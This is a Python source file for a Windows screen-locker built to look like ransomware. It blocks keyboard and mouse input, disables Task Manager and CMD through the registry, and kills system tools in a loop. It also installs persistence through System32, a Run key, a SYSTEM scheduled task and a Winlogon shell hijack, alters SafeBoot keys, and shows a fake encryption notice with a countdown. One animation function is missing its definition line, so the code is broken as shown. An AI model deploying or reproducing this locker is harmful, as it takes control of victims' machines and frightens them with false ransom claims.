# brutal_lock.py - RED ALERT PROFESSIONAL VERSION
import tkinter as tk
import ctypes
import os
import sys
import time
import threading
import random
import winsound
from datetime import datetime

# ============ RED ALERT SOUND ============
def play_red_alert():
    """Play emergency alarm sound"""
    try:
        for _ in range(10):
            winsound.Beep(1000, 500)
            winsound.Beep(800, 500)
    except:
        pass

# ============ KUNCI TOTAL SYSTEM ============
def lock_everything():
    """Lock all system inputs completely"""
    # Block ALL keyboard & mouse input
    ctypes.windll.user32.BlockInput(True)
    ctypes.windll.user32.SetCursorPos(0, 0)
    ctypes.windll.user32.ShowCursor(False)
    
    # Disable system tools
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD /t REG_DWORD /d 1 /f')
    os.system('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f')

# ============ GLITCH EFFECT ============
def create_glitch_effect(label):
    """Create glitch effect on text"""
    def glitch():
        colors = ['#ff0000', '#ff3333', '#ff6666', '#ff9999', '#ff0000']
        fonts = ['Consolas', 'Lucida Console', 'Courier New', 'Terminal']
        
        while True:
            try:
                # Random color change
                label.config(fg=random.choice(colors))
                
                # Random font change
                current_font = label.cget("font")
                font_parts = current_font.split()
                new_font = f"{random.choice(fonts)} {font_parts[1]} {font_parts[2]}"
                label.config(font=new_font)
                
                # Slight position shift for glitch effect
                label.place(x=random.randint(-5, 5), y=random.randint(-5, 5))
                time.sleep(0.1)
                label.place(x=0, y=0)
                time.sleep(0.5)
            except:
                break
    
    threading.Thread(target=glitch, daemon=True).start()

# ============ RED ALERT LOCK SCREEN WITH PASSWORD ============
def create_red_alert_lock():
    """Create professional red alert lock screen with password"""
    root = tk.Tk()
    root.title("SYSTEM ALERT")
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.overrideredirect(True)
    root.configure(bg='#0a0a0a')  # Dark background
    
    # CANNOT BE CLOSED
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # ============ PASSWORD HANDLING ============
    CORRECT_PASSWORD = "mzkyzak"
    password_attempts = 0
    max_attempts = 3
    
    def check_password():
        """Check if entered password is correct"""
        nonlocal password_attempts
        
        entered = password_entry.get()
        if entered == CORRECT_PASSWORD:
            # Correct password - unlock system
            password_status.config(text="✅ PASSWORD ACCEPTED", fg='#00ff00')
            root.after(2000, unlock_system)
        else:
            # Wrong password
            password_attempts += 1
            attempts_left = max_attempts - password_attempts
            
            if password_attempts >= max_attempts:
                password_status.config(text="❌ MAX ATTEMPTS REACHED - SYSTEM PERMANENTLY LOCKED", fg='#ff0000')
                password_entry.config(state='disabled')
                # Permanent lock - disable unlock
                unlock_button.config(state='disabled')
                # Add permanent lock measures
                os.system('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v "Minimal" /t REG_SZ /d "0" /f')
                os.system('reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot /v "Network" /t REG_SZ /d "0" /f')
            else:
                password_status.config(text=f"❌ ACCESS DENIED - {attempts_left} ATTEMPT(S) REMAINING", fg='#ff6666')
                password_entry.delete(0, tk.END)
            
            # Shake effect for wrong password
            for _ in range(3):
                root.geometry(f"{root.winfo_width()}x{root.winfo_height()}+5+5")
                root.update()
                time.sleep(0.05)
                root.geometry(f"{root.winfo_width()}x{root.winfo_height()}-5-5")
                root.update()
                time.sleep(0.05)
                root.geometry(f"{root.winfo_width()}x{root.winfo_height()}+0+0")
                root.update()
    
    def unlock_system():
        """Unlock the system"""
        print("🔓 SYSTEM UNLOCK INITIATED")
        
        # Show unlocking message
        for widget in main_frame.winfo_children():
            widget.destroy()
        
        unlock_frame = tk.Frame(main_frame, bg='#0a0a0a')
        unlock_frame.pack(expand=True)
        
        tk.Label(unlock_frame, 
                text="🔓 SYSTEM UNLOCK IN PROGRESS",
                font=('Consolas', 32, 'bold'),
                fg='#00ff00',
                bg='#0a0a0a').pack(pady=50)
        
        tk.Label(unlock_frame,
                text="Restoring system security...",
                font=('Lucida Console', 18),
                fg='#ffffff',
                bg='#0a0a0a').pack()
        
        root.update()
        
        # Actually unlock system
        ctypes.windll.user32.BlockInput(False)
        ctypes.windll.user32.ShowCursor(True)
        
        # Remove registry locks
        os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /f 2>nul')
        os.system('reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableCMD /f 2>nul')
        
        root.after(3000, root.destroy)
    
    # ============ MAIN CONTAINER ============
    main_frame = tk.Frame(root, bg='#0a0a0a')
    main_frame.pack(expand=True, fill='both', padx=50, pady=50)
    
    # ============ RED ALERT BANNER ============
    alert_frame = tk.Frame(main_frame, bg='#330000', relief='raised', bd=3)
    alert_frame.pack(fill='x', pady=(0, 30))
    
    alert_text = tk.Label(alert_frame, 
                         text="⛔ CRITICAL SYSTEM ALERT ⛔",
                         font=('Consolas', 36, 'bold'),
                         fg='#ff0000',
                         bg='#330000')
    alert_text.pack(pady=20, padx=40)
    
    # ============ WARNING MESSAGE ============
    warning_frame = tk.Frame(main_frame, bg='#1a0000', relief='sunken', bd=2)
    warning_frame.pack(fill='both', expand=True, pady=(0, 20))
    
    warning_text = """SYSTEM INTEGRITY COMPROMISED

• UNAUTHORIZED ACCESS DETECTED
• SECURITY BREACH IN PROGRESS
• ALL USER INPUTS LOCKED
• EMERGENCY PROTOCOL ACTIVATED

███ MALWARE SIGNATURE DETECTED ███
███ RANSOMWARE ACTIVITY CONFIRMED ███
███ SYSTEM ENCRYPTION IN PROGRESS ███"""
    
    warning_label = tk.Label(warning_frame,
                            text=warning_text,
                            font=('Lucida Console', 18),
                            fg='#ff3333',
                            bg='#1a0000',
                            justify='left')
    warning_label.pack(pady=40, padx=40)
    
    # ============ STATUS BAR ============
    status_frame = tk.Frame(main_frame, bg='#000000')
    status_frame.pack(fill='x', pady=(10, 0))
    
    # Encryption progress
    progress_label = tk.Label(status_frame,
                             text="ENCRYPTION STATUS: ",
                             font=('Courier New', 14),
                             fg='#ffffff',
                             bg='#000000')
    progress_label.pack(side='left', padx=(20, 10))
    
    progress_bar = tk.Label(status_frame,
                           text="▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮",
                           font=('Courier New', 16),
                           fg='#ff0000',
                           bg='#000000')
    progress_bar.pack(side='left')
    
    # ============ TIMER ============
    timer_frame = tk.Frame(main_frame, bg='#0a0a0a')
    timer_frame.pack(pady=(20, 10))
    
    timer_label = tk.Label(timer_frame,
                          text="⏰ SYSTEM LOCKDOWN TIMER: ",
                          font=('Consolas', 16),
                          fg='#ffffff',
                          bg='#0a0a0a')
    timer_label.pack(side='left')
    
    time_display = tk.Label(timer_frame,
                           text="72:00:00",
                           font=('Consolas', 20, 'bold'),
                           fg='#ff0000',
                           bg='#0a0a0a')
    time_display.pack(side='left', padx=(10, 0))
    
    # ============ CONTACT INFO ============
    contact_frame = tk.Frame(main_frame, bg='#002200', relief='groove', bd=2)
    contact_frame.pack(fill='x', pady=(20, 0))
    
    contact_text = """🔐 RECOVERY INSTRUCTIONS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• Contact Security Team: security@corporate.local
• Provide Incident ID: RANS-2026-8765-4321-ABCD
• Authorization Code Required for System Restoration
• Do NOT attempt manual recovery - May cause permanent data loss
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    contact_label = tk.Label(contact_frame,
                            text=contact_text,
                            font=('Terminal', 12),
                            fg='#00ff00',
                            bg='#002200',
                            justify='left')
    contact_label.pack(pady=15, padx=20)
    
    # ============ PASSWORD INPUT SECTION ============
    password_frame = tk.Frame(main_frame, bg='#001a00', relief='ridge', bd=3)
    password_frame.pack(fill='x', pady=(30, 20), padx=20)
    
    # Password label
    password_label = tk.Label(password_frame,
                             text="🔐 ADMIN RECOVERY ACCESS",
                             font=('Consolas', 20, 'bold'),
                             fg='#00ff00',
                             bg='#001a00')
    password_label.pack(pady=(20, 10))
    
    # Instructions
    instr_label = tk.Label(password_frame,
                          text="Enter administrator password to unlock system:",
                          font=('Lucida Console', 14),
                          fg='#ffffff',
                          bg='#001a00')
    instr_label.pack()
    
    # Password entry field
    password_entry_frame = tk.Frame(password_frame, bg='#001a00')
    password_entry_frame.pack(pady=15)
    
    tk.Label(password_entry_frame,
            text="Password: ",
            font=('Courier New', 16),
            fg='#ffffff',
            bg='#001a00').pack(side='left', padx=(0, 10))
    
    password_entry = tk.Entry(password_entry_frame,
                             font=('Terminal', 16),
                             show="•",  # Show dots instead of characters
                             width=20,
                             bg='#000000',
                             fg='#00ff00',
                             insertbackground='#00ff00',
                             relief='sunken',
                             bd=2)
    password_entry.pack(side='left')
    password_entry.focus_set()  # Auto focus on password field
    
    # Unlock button
    unlock_button = tk.Button(password_frame,
                             text=" UNLOCK SYSTEM ",
                             font=('Consolas', 14, 'bold'),
                             fg='#000000',
                             bg='#00ff00',
                             activeforeground='#000000',
                             activebackground='#33ff33',
                             relief='raised',
                             bd=3,
                             command=check_password)
    unlock_button.pack(pady=(10, 15))
    
    # Password status
    password_status = tk.Label(password_frame,
                              text="⏳ AWAITING AUTHORIZATION",
                              font=('Courier New', 12),
                              fg='#ffff00',
                              bg='#001a00')
    password_status.pack(pady=(0, 15))
    
    # Hint (optional - bisa dihapus kalo mau lebih secure)
    hint_label = tk.Label(password_frame,
                         text="Hint: mzkyzak",
                         font=('Terminal', 10),
                         fg='#666666',
                         bg='#001a00')
    hint_label.pack()
    
    # ============ FOOTER ============
    footer_frame = tk.Frame(main_frame, bg='#000000')
    footer_frame.pack(fill='x', pady=(20, 0))
    
    footer_text = tk.Label(footer_frame,
                          text="© 2026 CORPORATE SECURITY INCIDENT RESPONSE TEAM • LOGGED: " + datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                          font=('Courier New', 10),
                          fg='#666666',
                          bg='#000000')
    footer_text.pack(pady=10)
    
    # ============ ENTER KEY SUPPORT ============
    def on_enter_key(event):
        """Handle Enter key press"""
        check_password()
    
    # Bind Enter key to password check
    password_entry.bind('<Return>', on_enter_key)
    
    # ============ ANIMATIONS ============
        """Animate encryption progress"""
        segments = ["▮", "▯"]
        for i in range(1, 41):
            progress = "▮" * i + "▯" * (40 - i)
            progress_bar.config(text=progress)
            progress_label.config(text=f"ENCRYPTION STATUS: {i*2.5}%")
            root.update()
            time.sleep(0.05)
        
        # Complete encryption
        progress_bar.config(text="▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮▮", fg='#00ff00')
        progress_label.config(text="ENCRYPTION STATUS: ✅ COMPLETED", fg='#00ff00')
    
    def update_timer():
        """Countdown timer"""
        hours = 72
        minutes = 0
        seconds = 0
        
        while hours > 0 or minutes > 0 or seconds > 0:
            time_display.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
            
            # Color change based on time
            if hours < 1:
                time_display.config(fg='#ff3333')
            if hours < 12:
                time_display.config(fg='#ff6666')
            
            root.update()
            time.sleep(1)
            
            seconds -= 1
            if seconds < 0:
                seconds = 59
                minutes -= 1
            if minutes < 0:
                minutes = 59
                hours -= 1
        
        # Time expired
        time_display.config(text="00:00:00", fg='#ff0000')
        alert_text.config(text="⛔ TIME EXPIRED - SYSTEM PERMANENTLY LOCKED ⛔")
    
    # ============ APPLY GLITCH EFFECTS ============
    create_glitch_effect(alert_text)
    
    # ============ START ANIMATIONS ============
    threading.Thread(target=play_red_alert, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()
    threading.Thread(target=update_timer, daemon=True).start()
    
    # ============ KEEP ALIVE SYSTEM ============
    def system_guard():
        """Keep system locked and kill suspicious processes"""
        while True:
            try:
                # Ensure fullscreen
                if not root.attributes('-fullscreen'):
                    root.attributes('-fullscreen', True)
                    root.attributes('-topmost', True)
                
                # Kill security tools
                tools = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 
                        'regedit.exe', 'msconfig.exe', 'explorer.exe']
                for tool in tools:
                    os.system(f'taskkill /f /im {tool} 2>nul')
                
                # Keep inputs locked
                ctypes.windll.user32.BlockInput(True)
                
                root.update()
                time.sleep(1)
            except:
                # Restart if error
                time.sleep(2)
                os.system('python "' + sys.argv[0] + '"')
    
    threading.Thread(target=system_guard, daemon=True).start()
    
    root.mainloop()

# ============ PERSISTENCE INSTALLATION ============
def install_persistence():
    """Install multi-layer persistence"""
    script_path = os.path.abspath(sys.argv[0])
    
    # 1. System32 copy
    os.system(f'copy "{script_path}" C:\\Windows\\System32\\syslock.exe')
    os.system('attrib +h +s C:\\Windows\\System32\\syslock.exe')
    
    # 2. Registry persistence
    os.system('reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "SysGuard" /t REG_SZ /d "C:\\Windows\\System32\\syslock.exe" /f')
    
    # 3. Task Scheduler
    os.system('schtasks /create /tn "SystemGuard" /tr "C:\\Windows\\System32\\syslock.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f')
    
    # 4. Winlogon hijack
    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, C:\\Windows\\System32\\syslock.exe" /f')
    
    print("✅ SYSTEM LOCK INSTALLED - RED ALERT ACTIVE")

# ============ MAIN EXECUTION ============
if __name__ == "__main__":
    try:
        # Install persistence first
        install_persistence()
        
        # Lock all system inputs
        lock_everything()
        
        # Launch red alert lock screen
        create_red_alert_lock()
        
    except Exception as e:
        # Emergency restart on error
        print(f"⚠️ ERROR: {e}")
        print("🔄 RESTARTING LOCK SYSTEM...")
        time.sleep(3)
        os.system(f'python "{sys.argv[0]}"')